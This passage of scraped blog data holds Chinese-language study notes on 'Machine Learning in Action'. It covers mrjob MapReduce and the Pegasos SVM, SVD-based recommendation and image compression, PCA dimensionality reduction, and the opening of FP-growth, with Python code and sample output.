k-近邻算法：构建树存储数据，利用树形结构缩小搜索范围，该方法在特征数小于10的情况下效果很好。高维数据下（文本、图像、视频）的近邻查找方法是局部敏感哈希算法。 支持向量机：SMO算法构造的SVM无法在MapReduce框架实现，但Pegasos算法构造的SVM和“最邻近支持向量机”更快并且易于在MapReduce框架下实现。 奇异值分解：Lanczos算法是一个有效的求近似特征值的算法，可以应用在MapReduce上从而有效找到大数据的奇异值。该算法还可以应用于PCA。 K-均值聚类：canopy聚类是一个流行的分布式聚类方法，可以先调用canopy聚类法取得最初的k个簇，再运行K-均值聚类算法。 在Python中使用mrjob自动化MapReduce mrjob之前是Yelp的内部框架，2010年底开源。可以用于在Amazon网络服务上启动MapReduce作业。可以通过pip安装，也可以clone GitHub上的源码来安装。在AWS上使用mrjob之前需要设置AWS_ACCESS_KEY_ID和AWS_SECRET_ACCESS_KEY两个环境变量。 使用mrjob可以在EMR上运行Hadoop流，也可以在单机上测试。单机测试的命令为% python mrMean.py &lt; inputFile.txt &gt; myOut.txt，在EMR上运行同样任务的命令为% python mrMean.py -r emr &lt; inputFile.txt &gt; myOut.txt。所有上传和表单填写由mrjob自动完成。 添加下面代码到mrMean.py，创建一个新的MRJob继承类，代码中的mapper和reducer都是该类的方法。steps方法定义了执行的步骤，在该方法中需要为mrjob制定mapper和reducer的名称，未指出则默认调用mapper和reducer。将原来代码中的mr方法修改为mrjob.step.MRStep。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from mrjob.job import MRJobimport mrjobclass MRmean(MRJob): def __init__(self, *args, **kwargs): super(MRmean, self).__init__(*args, **kwargs) self.inCount = 0 self.inSum = 0 self.inSqSum = 0 def map(self, key, val): if False: yield inVal = float(val) self.inCount += 1 self.inSum += inVal self.inSqSum += inVal*inVal def map_final(self): mn = self.inSum/self.inCount mnSq = self.inSqSum/self.inCount yield(1, [self.inCount, mn, mnSq]) def reduce(self, key, packedValues): cumVal = 0.0; cumSumSq = 0.0; cumN = 0.0 for valArr in packedValues: nj = float(valArr[0]) cumN += nj cumVal += nj*float(valArr[1]) cumSumSq += nj*float(valArr[2]) mean = cumVal/cumN var = (cumSumSq - 2*mean*cumVal + cumN*mean*mean)/cumN yield(mean, var) def steps(self): return ([mrjob.step.MRStep(mapper=self.map, reducer=self.reduce,\\ mapper_final=self.map_final)])if __name__ == '__main__': MRmean.run()$ python mrMean.py --mapper &lt; inputFile.txt1 [100, 0.5095697, 0.34443931307936]$ python mrMean.py &lt; inputFile.txtreading from STDINwriting to %\\mrMean.Forec.20160227.045814.965000\\step-0-mapper_part-00000Counters from step 1: (no counters found)writing to %\\mrMean.Forec.20160227.045814.965000\\step-0-mapper-sorted&gt; sort '%\\mrMean.Forec.20160227.045814.965000\\step-0-mapper_part-00000'writing to %\\mrMean.Forec.20160227.045814.965000\\step-0-reducer_part-00000Counters from step 1: (no counters found)Moving %\\mrMean.Forec.20160227.045814.965000\\step-0-reducer_part-00000\\ -&gt; %\\mrMean.Forec.20160227.045814.965000\\output\\part-00000Streaming final output from %\\mrMean.Forec.20160227.045814.965000\\output0.5095697 0.08477803392126998removing tmp directory %\\mrMean.Forec.20160227.045814.965000 分布式SVM的Pegasos算法Pegasos算法 SMO算法的一个替代品是Pegasos算法，后者可以很容易写成MapReduce形式。Pegasos是指原始估计梯度求解器（Primal Estimated sub-GrAdient Solver）。该算法使用某种形式的随机梯度下降方法来解决SVM所定义的优化问题，该算法所需的迭代次数取决于用户所期望的精确度而不是数据集的大小。其工作流程是：从训练集中随机挑选一些样本点添加到待处理列表中，之后按序判断每个样本点是否能被分类正确；如果是则忽略，否则将其加入待更新集合。批处理完毕后，权重向量按照这些错分的样本进行更新。伪代码为： 将W初始化为0 对每次批处理 &nbsp;&nbsp;&nbsp;&nbsp;随机选择k个样本点（向量） &nbsp;&nbsp;&nbsp;&nbsp;对每个向量 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果该向量被错分 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;更新权重向量W &nbsp;&nbsp;&nbsp;&nbsp;累加对W的更新 代码为Pegasos算法的串行版本，输入值T和k分别设定了迭代次数和待处理列表的大小。在T次迭代过程中，每次需要重新计算eta。 1234567891011121314151617def predict(w, x): return w*x.Tdef batchPegasos(dataSet, labels, lam, T, k): import random m, n = shape(dataSet); w = zeros(n) dataIndex = range(m) for t in range(1, T+1): wDelta = mat(zeros(n)) eta = 1.0/(lam*t) random.shuffle(dataIndex) for j in range(k): i = dataIndex[j] p = predict(w, dataSet[i,:]) if labels[i]*p &lt; 1: wDelta += labels[i]*dataSet[i,:].A w = (1.0 - 1/t)*w + (eta/k)*wDelta return w mrjob实现MapReduce版本的SVM Pegasos算法有大量的内积计算，内积计算可以并行。Cinfigure_options方法建立了一些变量，包括迭代次数T，待处理列表大小k。steps方法告诉mrjob应该做什么，按照什么顺序做。其创建了一个python列表，包含map、map_fin和reduce几个步骤，最后将该列表乘以迭代次数，即在每次迭代中重复调用这个列表。mapper需要能够正确读取reducer输出的数据，对输入和输出格式作如下规定：Mapper输入为&lt;mapperNum, valueList&gt;，无输出；Mapper_final无输入，输出为&lt;l, valueList&gt;；Reducer的输入输出均为&lt;mapperNum, valueList&gt;。传入的值是列表数组，valueList第一个元素是一个字符串，表示列表后面存放的数据类型，每个Mapper_final都将输出同样的key以保证所有的key/value都输出给同一个reducer。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970from mrjob.job import MRJobimport mrjobimport picklefrom numpy import *class MRsvm(MRJob): DEFAULT_INPUT_PROTOCOL = 'json_value' def __init__(self, *args, **kwargs): super(MRsvm, self).__init__(*args, **kwargs) self.data = pickle.load(open('%\\\\svmDat27')) self.w = 0 self.eta = 0.69 self.dataList = [] self.k = self.options.batchsize self.numMappers = 1 self.t = 1 def map(self, mapperId, inVals): #needs exactly 2 arguments #input: nodeId, ('w', w-vector) OR nodeId, ('x', int) if False: yield if inVals[0]=='w': #accumulate W-vector self.w = inVals[1] elif inVals[0]=='x': self.dataList.append(inVals[1])#accumulate data points to calc elif inVals[0]=='t': self.t = inVals[1] else: self.eta=inVals #this is for debug, eta not used in map def map_fin(self): labels = self.data[:,-1]; X=self.data[:,0:-1]#reshape data into X and Y if self.w == 0: self.w = [0.001]*shape(X)[1] #init w on first iteration for index in self.dataList: p = mat(self.w)*X[index,:].T #calc p=w*dataSet[key].T if labels[index]*p &lt; 1.0: yield (1, ['u', index])#make sure everything has the same key yield (1, ['w', self.w]) #so it ends up at the same reducer yield (1, ['t', self.t]) def reduce(self, _, packedVals): for valArr in packedVals: #get values from streamed inputs if valArr[0]=='u': self.dataList.append(valArr[1]) elif valArr[0]=='w': self.w = valArr[1] elif valArr[0]=='t': self.t = valArr[1] labels = self.data[:,-1]; X=self.data[:,0:-1] wMat = mat(self.w); wDelta = mat(zeros(len(self.w))) for index in self.dataList: wDelta += float(labels[index])*X[index,:] #wDelta += label*dataSet eta = 1.0/(2.0*self.t) #calc new: eta #calc new: w = (1.0 - 1/t)*w + (eta/k)*wDelta wMat = (1.0 - 1.0/self.t)*wMat + (eta/self.k)*wDelta for mapperNum in range(1,self.numMappers+1): yield (mapperNum, ['w', wMat.tolist()[0] ]) #emit w if self.t &lt; self.options.iterations: yield (mapperNum, ['t', self.t+1])#increment T for j in range(self.k/self.numMappers):#emit random ints for mappers iid yield (mapperNum, ['x', random.randint(shape(self.data)[0]) ]) def configure_options(self): super(MRsvm, self).configure_options() self.add_passthrough_option('--iterations', dest='iterations', default=2,\\ type = 'int', help='T: number of iterations to run') self.add_passthrough_option('--batchsize', dest='batchsize', default=100,\\ type='int', help='k: number of data points in a batch') def steps(self): return ([mrjob.step.MRStep(mapper=self.map, mapper_final=self.map_fin, \\ reducer=self.reduce)]*self.options.iterations)if __name__ == '__main__': MRsvm.run() 大多数情况下并不需要使用MapReduce框架，如果作业花费了太多时间，首先应思考能否用更高效的语言编写，或者是否可以优化。寻找影响处理速度的瓶颈才能根本解决效率底下的问题。 MapReduce总结 当运算需求超出了当前资源的运算能力，可以考虑购买更好的机器，或者租用网络服务并使用MapReduce框架并行执行。很多机器学习算法都可以容易地写成MapReduce作业，而某些需要经过重写。大部分情况下，MapReduce并不需要。 参考文献： 《机器学习实战 - 美Peter Harrington》 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2016/02/27/machinelearning15/) 、作者信息（Forec）和本声明。","categories":[{"name":"大数据/分布式系统","slug":"大数据-分布式系统","permalink":"http://forec.github.io/categories/大数据-分布式系统/"}],"tags":[{"name":"Algorithms","slug":"Algorithms","permalink":"http://forec.github.io/tags/Algorithms/"},{"name":"机器学习","slug":"机器学习","permalink":"http://forec.github.io/tags/机器学习/"}],"keywords":[{"name":"大数据/分布式系统","slug":"大数据-分布式系统","permalink":"http://forec.github.io/categories/大数据-分布式系统/"}]},{"title":"机器学习笔记（Chapter 14 - SVD简化）","slug":"machinelearning14","date":"2016-02-26T13:38:59.000Z","updated":"2017-08-22T07:30:10.000Z","comments":true,"path":"2016/02/26/machinelearning14/","link":"","permalink":"http://forec.github.io/2016/02/26/machinelearning14/","excerpt":"从数据中提取一些关键信息可以使用奇异值分解（Singular Value Decomposition，SVD），可以简化数据，去除噪声，将数据映射到低维空间。","text":"从数据中提取一些关键信息可以使用奇异值分解（Singular Value Decomposition，SVD），可以简化数据，去除噪声，将数据映射到低维空间。 SVD应用 奇异值分解的优点是简化数据，去除噪声，提高算法结果，用小得多的数据集表示原始数据集，实际上是取出了噪声。缺点是数据的转换可能难以理解。适用于数值型数据。 隐性语义索引（Latent Semantic Indexing，LSI）是SVD最早的应用之一。LSI中，一个矩阵是由文档和词语组成的，在该矩阵上应用SVD时，会构建出多个奇异值。这些奇异值代表了文档中的概念或主题，该特点可以用于更高效的文档搜索。在词语拼写错误或者出现同义词时，只基于词语存在与否的搜索方法会遇到问题，如果使用SVD从上千篇相似文档中抽取概念，那么同义词会被映射为同一概念。 推荐系统。利用SVD从数据中构建一个主题空间，然后再在该空间下计算其相似度。 矩阵分解 很多情况下数据中的一小段携带了数据集中的大部分信息。其他信息要么是噪声，要么是毫不相关的信息。矩阵分解可以将原始矩阵表示成新的易于处理的形式，过程类似代数中的因子分解。SVD是最常见的一种矩阵分解技术，SVD将原始数据集Data分解为三个矩阵：U，∑和V^T，这三个矩阵分别是mxm，mxn和nxn。其中矩阵∑只有对角元素，其他元素均为0，并且∑的对角元素是从大到小排列的，这些对角元素称为奇异值，它们对应了原始数据Data的奇异值。这里的奇异值就是矩阵Data*Data^T的特征值的平方根。 在某个奇异值的数目（r个）之后，其他奇异值都置为0，这意味着数据集只有r个重要特征，其余特征都是噪声或者冗余特征。 numpy中的linalg有一个svd方法：U, Sigma, VT = linalg.svd(Data)。注意∑虽然是矩阵，但为了节约空间以array的形式返回。下面的代码(svdRec.py)展示了对样例矩阵求∑的过程。 123456789101112131415def loadExData(): return [[1, 1, 1, 0, 0], [2, 2, 2, 0, 0], [1, 1, 1, 0, 0], [5, 5, 5, 0, 0], [1, 1, 0, 2, 2], [0, 0, 0, 3, 3], [0, 0, 0, 1, 1]]&gt;&gt;&gt; Data=svdRec.loadExData()&gt;&gt;&gt; from numpy import *&gt;&gt;&gt; U, Sigma, VT = linalg.svd(Data)&gt;&gt;&gt; Sigmaarray([ 9.72140007e+00, 5.29397912e+00, 6.84226362e-01, 1.70188300e-16, 5.01684085e-47]) 从上面返回的∑矩阵可以看出，前三个数值比最后两个值大了很多，因此可以将最后两个值去掉，构成一个3x3的对角矩阵Sig3。若要从U，∑和V^T中构造原始矩阵的近似矩阵，只需要用U的前三列和V^T的前三行。实际操作中，确定要保留的奇异值的个数有两种方法：一是将所有的奇异值map成平方和，之后从前向后叠加，直到累加到总值的90%；二是启发式策略，当矩阵有上万的奇异值时，只保留前3000个，前提是对数据有足够的了解，确保3000个奇异值足够覆盖总平方和的90%。 12345678910111213141516171819&gt;&gt;&gt; Sig3 = eye(3)*Sigma[:3]array([[ 9.72140007, 0. , 0. ], [ 0. , 5.29397912, 0. ], [ 0. , 0. , 0.68422636]])&gt;&gt;&gt; U[:,:3]*mat(Sig3)*VT[:3,:]matrix([[ 1.00000000e+00, 1.00000000e+00, 1.00000000e+00, 2.26272993e-16, 2.25622472e-16], [ 2.00000000e+00, 2.00000000e+00, 2.00000000e+00, 2.48715978e-16, 2.47198095e-16], [ 1.00000000e+00, 1.00000000e+00, 1.00000000e+00, -1.18232247e-15, -1.18297299e-15], [ 5.00000000e+00, 5.00000000e+00, 5.00000000e+00, 2.90999863e-16, 2.87530416e-16], [ 1.00000000e+00, 1.00000000e+00, -7.77156117e-16, 2.00000000e+00, 2.00000000e+00], [ 3.33066907e-16, 6.10622664e-16, -4.99600361e-16, 3.00000000e+00, 3.00000000e+00], [ 1.04083409e-16, 1.87350135e-16, -1.80411242e-16, 1.00000000e+00, 1.00000000e+00]]) 基于协同过滤的推荐引擎 协同过滤通过将用户和其他用户的数据进行对比来实现推荐。 相似度计算 利用不同用户对某一件物品的评分来计算相似度。举例如下表。鳗鱼饭日式炸鸡寿司饭烤牛肉手撕猪肉Jim20044John55533Sally24212可以使用多种方法计算相似度。 欧氏距离：计算手撕牛肉和烤牛肉的距离为sqrt[(4-4)^2+(3-3)^2+(2-1)^2]=1，手撕牛肉和鳗鱼饭的距离为sqrt[(4-2)^2+(3-5)^2+(2-2)^2=2.83。可以使用“相似度=1/(1+距离)”来将相似度控制在0~1之间。 皮尔逊相关系数：该方法较欧氏距离的优势在于，它对用户评分的量级不敏感，例如所有评分都是5分和所有评分都是1分在这里是相同的。numpy中皮尔逊相关系数计算由corrcoef()方法完成，通过0.5+0.5*corrcoef()控制相似度在0~1之间。 余弦相似度：对于两个向量，计算其夹角余弦值来比较相似程度。numpy中提供了linalg.norm()方法用于计算单个向量的2范数（平方和取根）。因为cos在-1~1之间，同样用0.5+0.5*cos来控制相似度在0~1之间。 上面几种相似度计算的代码如下，分别为eulidSim，pearsSim和cosSim。 12345678910111213141516171819202122from numpy import *from numpy import linalg as ladef eulidSim(inA, inB): return 1.0/(1.0 + la.norm(inA - inB))def pearsSim(inA, inB): if len(inA) &lt; 3: return 1.0 return 0.5 + 0.5*corrcoef(inA, inB, rowvar = 0)[0][1]def cosSim(inA, inB): num = float(inA.T * inB) denom = la.norm(inA) * la.norm(inB) return 0.5+0.5*(num/denom)&gt;&gt;&gt; myMat = mat(svdRec.loadExData())&gt;&gt;&gt; svdRec.eulidSim(myMat[:,0], myMat[:,4])0.13367660240019172&gt;&gt;&gt; svdRec.cosSim(myMat[:,0], myMat[:,4])0.54724555912615336&gt;&gt;&gt; svdRec.pearsSim(myMat[:,0], myMat[:,4])0.23768619407595826 基于用户还是物品 通过计算两种菜肴之间的距离是基于物品的相似度。另一种计算用户距离的方法是基于用户的相似度。在上面的表格示例中，行与行之间的比较是基于用户的相似度，列与列之间的比较是基于物品的相似度。使用哪一种相似度取决于用户或物品的数目。基于X的相似度计算所需的时间会随着X的增长而增长，通常如果用户数目很多并且会不断增长，我们倾向于使用基于物品的相似度计算。 推荐引擎评价 通常用于推荐引擎评价的指标是“最小方均根误差（RMSE）”，它计算均方误差的平均值并开根。若评级在1~5分，而RMSE的结果为1.0，说明预测值和用户给出的真实评价差了一分。 餐馆菜肴推荐引擎 给定一个用户，系统会为此用户选择N个最好的推荐菜。整个流程需要做到：寻找用户没有评分的菜肴，在这些没有评分的所有菜肴中，对每种菜计算一个可能的评级分数，即预测用户会对该菜肴做出的评分。最后将评分从高到低排序，返回前N个物品。 推荐没有品尝过的菜肴：两个函数，standEst()用于在给定计算相似度方法的前提下，计算用户对某种物品的可能评分；recommend()是推荐引擎，调用standEst函数，并返回前N个最好物品。在standEst的执行过程中，假设要计算用户u对其未打分的菜肴i的可能评分，则需要通过其他物品j和物品i建立联系。扫描所有n个物品，如果用户u对某个物品j有过评分，则寻找所有用户中即对i又对j评分过的用户群体users，根据users们的打分，计算出物品i和物品j的相似度。最后将这个相似度乘以用户u对物品j的评分累加到ratSimTotal变量，将相似度累加到simTotal变量。最后返回ratSimTotal/simTotal就是可能评分。 123456789101112131415161718192021222324252627282930313233343536373839404142def standEst(dataMat, user, simMeas, item): n = shape(dataMat)[1] simTotal = 0.0; ratSimTotal = 0.0 for j in range(n): userRating = dataMat[user,j] if userRating == 0: continue overLap = nonzero(logical_and(dataMat[:,item].A&gt;0,\\ dataMat[:,j].A&gt;0))[0] if len(overLap) == 0: similarity = 0 else: similarity = simMeas(dataMat[overLap, item],\\ dataMat[overLap, j]) simTotal += similarity ratSimTotal += similarity * userRating if simTotal == 0: return 0 else: return ratSimTotal/simTotaldef recommend(dataMat, user, N=3, simMeas = cosSim, estMethod = standEst): unratedItems = nonzero(dataMat[user,:].A==0)[1] if len(unratedItems) == 0: return 'you rated everything' itemScores = [] for item in unratedItems: estimatedScore = estMethod(dataMat, user, simMeas, item) itemScores.append((item, estimatedScore)) return sorted(itemScores, key=lambda k: k[1], reverse=True)[:N]&gt;&gt;&gt; myMat = mat(svdRec.loadExData())&gt;&gt;&gt; myMat[0,1]=myMat[0,0]=myMat[1,0]=myMat[2,0] = 4&gt;&gt;&gt; myMat[3,3] =2&gt;&gt;&gt; myMatmatrix([[4, 4, 1, 0, 0], [4, 2, 2, 0, 0], [4, 1, 1, 0, 0], [5, 5, 5, 2, 0], [1, 1, 0, 2, 2], [0, 0, 0, 3, 3], [0, 0, 0, 1, 1]])&gt;&gt;&gt; svdRec.recommend(myMat,2)[(4, 2.5), (3, 1.9703483892927431)]&gt;&gt;&gt; svdRec.recommend(myMat,2,simMeas = svdRec.eulidSim)[(4, 2.5), (3, 1.9866572968729499)]&gt;&gt;&gt; svdRec.recommend(myMat,2,simMeas = svdRec.pearsSim)[(4, 2.5), (3, 2.0)] 在代码中加入loadExData2()方法，利用svd处理该矩阵，分析当前矩阵可以发现前三个奇异值就已经占据总能量的90%。 1234567891011121314&gt;&gt;&gt; U, Sigma, VT = linalg.svd(mat(svdRec.loadExData2()))&gt;&gt;&gt; Sigmaarray([ 15.77075346, 11.40670395, 11.03044558, 4.84639758, 3.09292055, 2.58097379, 1.00413543, 0.72817072, 0.43800353, 0.22082113, 0.07367823])&gt;&gt;&gt; Sig2 = Sigma**2&gt;&gt;&gt; sum(Sig2)541.99999999999966&gt;&gt;&gt; sum(Sig2)*0.9487.79999999999973&gt;&gt;&gt; sum(Sig2[:2])378.8295595113579&gt;&gt;&gt; sum(Sig2[:3])500.50028912757938 因为前三个奇异值已经包含了90%的能量，因此可以将11维数据缩减为3维。添加svdEst方法用于简化数据，这里对原书代码做了一点修改，自动提取前90%能量的奇异值。评估相似度时使用的矩阵是一个nxi的矩阵，这里的i是提取的奇异值个数，n是物品数目。不同用户对物品k的评分已经被压缩到第k行的i个数据中，只要计算两个1xi向量的相似度即可。 12345678910111213141516171819202122232425262728293031323334def svdEst(dataMat, user, simMeas, item): n = shape(dataMat)[1] simTotal = 0.0; ratSimTotal = 0.0 U, Sigma, VT = la.svd(dataMat) sumTotal = 0 for singular in Sigma: sumTotal += singular**2 singularMax = 0 for i in range(len(Sigma)): singularMax += Sigma[i]**2 if singularMax &gt;= sumTotal*0.9: break SigI = mat(eye(i+1)*Sigma[:i+1]) xformedItems = dataMat.T * U[:,:i+1] * SigI.I # n x m m x i i x i =&gt; n x i for j in range(n): userRating = dataMat[user,j] if userRating == 0 or j == item: continue similarity = simMeas(xformedItems[item,:].T,\\ xformedItems[j,:].T) print 'the %d and %d similarity is: %f' % (item, j, similarity) simTotal += similarity ratSimTotal += similarity * userRating if simTotal == 0: return 0 else: return ratSimTotal/simTotal&gt;&gt;&gt; myMat = mat(svdRec.loadExData2())&gt;&gt;&gt; svdRec.recommend(myMat, 1, N=3, estMethod = svdRec.svdEst)the 0 and 3 similarity is: 0.485722the 0 and 5 similarity is: 0.486944....[(6, 3.3329499901459845), (9, 3.3315447178728395), (4, 3.3314474877128624)]&gt;&gt;&gt; svdRec.recommend(myMat, 1, simMeas = svdRec.pearsSim)[(6, 3.3333333333333335), (9, 3.3333333333333335), (0, 3.0)] SVD在大数据集上会显著降低程序速度，可以仅在程序调入运行时离线加载一次。其中计算出的相似度是物品和物品之间的相似度，不同的用户也可以重复使用，因此可以将计算结果离线。当出现冷启动问题时，可以将推荐看成搜索问题，为物品添加标签，使用基于内容的推荐。 基于SVD的图像压缩 用一个32*32（1024像素）的矩阵表示一个图像，通过svd对该矩阵降维，实现压缩重构。运行结果太长，但基本还原了原来的矩阵（可以观察出部分像素点不同）。U和V^T都是32x2的矩阵，有两个奇异值，因此总数字数目为64x2+2=130，获得了几乎10倍的压缩比。 12345678910111213141516171819202122232425def printMat(inMat, thresh=0.8): for i in range(32): for k in range(32): if float(inMat[i,k]) &gt; thresh: print 1, else: print 0, print ''def imgCompress(numSV=3, thresh=0.8): myl = [] for line in open('0_5.txt').readlines(): newRow = [] for i in range(32): newRow.append(int(line[i])) myl.append(newRow) myMat = mat(myl) print \"****original matrix******\" printMat(myMat, thresh) U,Sigma,VT = la.svd(myMat) SigRecon = mat(zeros((numSV, numSV))) for k in range(numSV):#construct diagonal matrix from vector SigRecon[k,k] = Sigma[k] reconMat = U[:,:numSV]*SigRecon*VT[:numSV,:] print \"****reconstructed matrix using %d singular values******\" % numSV printMat(reconMat, thresh) SVD总结 SVD可以逼近矩阵并从中提取重要特征。通过保留矩阵80%~90%的能量，可以去除噪声，保留重要特征，在稀疏矩阵的压缩上作用显著。SVD的其中一个应用是推荐引擎，协同过滤基于用户喜好或者行为数据来推荐，核心是相似度计算方法，SVD可以将高维用户群体降维成少数奇异值，提高推荐引擎效果。在大规模数据集上，SVD的冗余计算会占用过多时间，可以通过离线方式SVD分解和相似度计算。 参考文献： 《机器学习实战 - 美Peter Harrington》 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2016/02/26/machinelearning14/) 、作者信息（Forec）和本声明。","categories":[{"name":"大数据/分布式系统","slug":"大数据-分布式系统","permalink":"http://forec.github.io/categories/大数据-分布式系统/"}],"tags":[{"name":"Algorithms","slug":"Algorithms","permalink":"http://forec.github.io/tags/Algorithms/"},{"name":"机器学习","slug":"机器学习","permalink":"http://forec.github.io/tags/机器学习/"}],"keywords":[{"name":"大数据/分布式系统","slug":"大数据-分布式系统","permalink":"http://forec.github.io/categories/大数据-分布式系统/"}]},{"title":"机器学习笔记（Chapter 13 - PCA简化）","slug":"machinelearning13","date":"2016-02-25T04:15:43.000Z","updated":"2017-08-22T07:30:14.000Z","comments":true,"path":"2016/02/25/machinelearning13/","link":"","permalink":"http://forec.github.io/2016/02/25/machinelearning13/","excerpt":"在低维下，数据更容易进行处理，其相关特征可能在数据中明确显示出来。PCA是降维技术中最广泛的一种。","text":"在低维下，数据更容易进行处理，其相关特征可能在数据中明确显示出来。PCA是降维技术中最广泛的一种。 降维技术 数据往往拥有超出显示能力的更多特征，简化数据不止使得数据容易显示，同时降低算法计算开销、去除噪声、使得结果易懂。 主成分分析（Principal Component Analysis，PCA）将数据从原来的坐标系转移到新的坐标系，新坐标系的选择由数据本身决定，新坐标系的第一个坐标轴是原始数据中方差最大的方向，新坐标系的第二个坐标轴和第一个坐标轴正交、并且具有最大方差。该过程一直重复，次数为原始数据中维度。大部分方差都包含在前面几个新坐标轴中，因此可以忽略剩下的坐标轴。 因子分析（Factor Analysis）假设观察数据的生成中有一些观察不到的隐变量，即观察数据是由这些隐变量和某些噪声的线性组合，那么隐变量的数据可能比观察数据的数目少，找到隐变量就可以实现数据的降维。 独立成分分析（Independent Component Analysis，ICA）假设数据从N个数据源生成，类似因子分析，假设这些数据源之间在统计上相互独立，如果数据源数目少于观察数据数目，就实现降维过程。 PCA PCA可以降低数据复杂性，识别最重要的多个特征，但有时不一定需要，并且可能损失有用信息。适用于数值型数据。 对于下图的数据，要找出一条直线尽可能覆盖这些点，第一条坐标轴旋转到最大方差的方向，数据的最大方差给出了数据的最重要的信息。在选择了覆盖数据最大差异性的坐标轴之后，选择第二条坐标轴与第一条正交。在下面的示例中，只需要一维信息，另一维信息只是对分类缺乏贡献的噪声数据。可以采用决策树，也可以使用SVM获得更好的分类间隔，但是分类超平面很难解释。PCA降维可以同时获得SVM和决策树的优点。 PCA过程实现：第一个主成分从数据差异性最大的方向获取，可以通过数据集的协方差矩阵 Convariance和特征值分析求得。下面pca函数的流程为，首先去除平均值，之后计算协方差矩阵cov，计算协方差矩阵的特征值和特征向量linalg.eig，将特征值从大到小排序，保留对应的最上面的N个特征向量，最后将数据转换到上述N个特征向量构建的新空间中。 1234567891011121314151617181920from numpy import *def loadDataSet(fileName, delim = '\\t'): fr = open(fileName) stringArr = [line.strip().split(delim) for line in fr.readlines()] datArr = [map(float, line) for line in stringArr] return mat(datArr)def pca(dataMat, topNfeat = 999999): meanVals = mean(dataMat, axis = 0) meanRemoved = dataMat - meanVals covMat = cov(meanRemoved, rowvar = 0) # n*n eigVals, eigVects = linalg.eig(mat(covMat)) # 1*n, n*n eigValInd = argsort(eigVals) eigValInd = eigValInd[:-(topNfeat+1):-1] redEigVects = eigVects[:,eigValInd] lowDDataMat = meanRemoved * redEigVects reconMat = (lowDDataMat * redEigVects.T) + meanVals return lowDDataMat, reconMat 运行示例如下，下图是构造出的第一主成分。 12345678910111213&gt;&gt;&gt; dataMat = pca.loadDataSet('testSet.txt')&gt;&gt;&gt; lowDMat, reconMat = pca.pca(dataMat, 1)&gt;&gt;&gt; shape(lowDMat)(1000, 1)&gt;&gt;&gt; import matplotlib&gt;&gt;&gt; import matplotlib.pyplot as plt&gt;&gt;&gt; fig = plt.figure()&gt;&gt;&gt; ax = fig.add_subplot(111)&gt;&gt;&gt; ax.scatter(dataMat[:,0].flatten().A[0], dataMat[:,1].flatten().A[0],\\ marker = '^', s = 90)&gt;&gt;&gt; ax.scatter(reconMat[:,0].flatten().A[0], reconMat[:,1].flatten().A[0],\\ marker = 'o', s = 50)&gt;&gt;&gt; plt.show() 利用PCA对半导体制造数据降维 数据集来自UCI机器学习数据库，包含590个特征，其中几乎所有样本都存在特征缺失，用NaN表示，通过replaceNanWithMean将缺失的NaN数据用其他样本的相同特征值平均值填充。 1234567def replaceNanWithMean(): datMat = loadDataSet('secom.data', ' ') numFeat = shape(datMat)[1] for i in range(numFeat): meanVal = mean(datMat[nonzero(~isnan(datMat[:,i].A))[0], i]) datMat[nonzero(isnan(datMat[:,i].A))[0], i] = meanVal return datMat 从特征值可以看出，有超过20%特征值为0，这些特征都是其他特征的副本。 12345678910111213&gt;&gt;&gt; dataMat = pca.replaceNanWithMean()&gt;&gt;&gt; meanVals = mean(dataMat, axis=0)&gt;&gt;&gt; meanRemoved = dataMat - meanVals&gt;&gt;&gt; covMat = cov(meanRemoved, rowvar=0)&gt;&gt;&gt; eigVals, eigVects = linalg.eig(mat(covMat))array([ 5.34151979e+07, 2.17466719e+07, 8.24837662e+06, 2.07388086e+06, 1.31540439e+06, 4.67693557e+05, 2.90863555e+05, 2.83668601e+05, 2.37155830e+05, 2.08513836e+05, 1.96098849e+05, 1.86856549e+05, ...... 0.00000000e+00, 0.00000000e+00, 0.00000000e+00, 0.00000000e+00, 0.00000000e+00, 0.00000000e+00, 0.00000000e+00, 0.00000000e+00, 0.00000000e+00, 下图是前二十个主成分占总方差的百分比，大部分方差都包含在前面几个主成分中，前6个特征覆盖了96.8%的方差。因此可以将590个特征缩减到这6个特征。现实中我们无法精确知道所需要的主成分数目，必须通过实验取不同值来确定。 PCA总结 降维技术使数据更易使用，并且它们往往能够去除数据中的噪声，通常作为预处理步骤，在算法应用前清洗数据。PCA可以从数据中识别主要特征，它通过沿着数据最大方差方向旋转坐标轴实现。如果要处理的数据过多无法放入内存，可以使用在线PCA分析，参考论文“Incremental Eigenanalysis for Classification”。 参考文献： 《机器学习实战 - 美Peter Harrington》 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2016/02/25/machinelearning13/) 、作者信息（Forec）和本声明。","categories":[{"name":"大数据/分布式系统","slug":"大数据-分布式系统","permalink":"http://forec.github.io/categories/大数据-分布式系统/"}],"tags":[{"name":"Algorithms","slug":"Algorithms","permalink":"http://forec.github.io/tags/Algorithms/"},{"name":"机器学习","slug":"机器学习","permalink":"http://forec.github.io/tags/机器学习/"}],"keywords":[{"name":"大数据/分布式系统","slug":"大数据-分布式系统","permalink":"http://forec.github.io/categories/大数据-分布式系统/"}]},{"title":"机器学习笔记（Chapter 12 - FP-growth算法）","slug":"machinelearning12","date":"2016-02-24T12:19:23.000Z","updated":"2017-08-22T07:30:18.000Z","comments":true,"path":"2016/02/24/machinelearning12/","link":"","permalink":"http://forec.github.io/2016/02/24/machinelearning12/","excerpt":"FP-growth算法基于Apriori构建，先将数据集存储在FP树内，再发现频繁项集，速度通常快于Apriori两个数量级以上。FP-growth只需要对数据库扫描两次，而Apriori需要对每个潜在的频繁项集扫描一次数据集。Apriori算法拓展性更好，可以用于并行计算。","text":"FP-growth算法基于Apriori构建，先将数据集存储在FP树内，再发现频繁项集，速度通常快于Apriori两个数量级以上。FP-growth只需要对数据库扫描两次，而Apriori需要对每个潜在的频繁项集扫描一次数据集。Apriori算法拓展性更好，可以用于并行计算。 FP树 FP-growth算法速度优于Apriori，但实现相对困难，在某些数据集上性能会下降，适用于标称型数据。FP代表频繁模式，FP-growth算法将数据存储在FP树中。 